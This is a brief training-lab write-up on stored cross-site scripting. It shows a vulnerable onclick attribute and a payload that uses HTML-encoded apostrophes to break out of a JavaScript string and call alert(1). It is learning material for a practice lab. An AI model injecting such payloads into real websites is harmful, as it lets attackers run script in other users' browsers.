Lab #23 - Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

Target Goal - Perform an XSS attack that calls the alert function when the comment author name is clicked.

Analysis:

onclick="var tracker={track(){}};tracker.track('http://www.test.ca&apos;-alert(1)-&apos;');">


http://www.test.ca&apos;-alert(1)-&apos;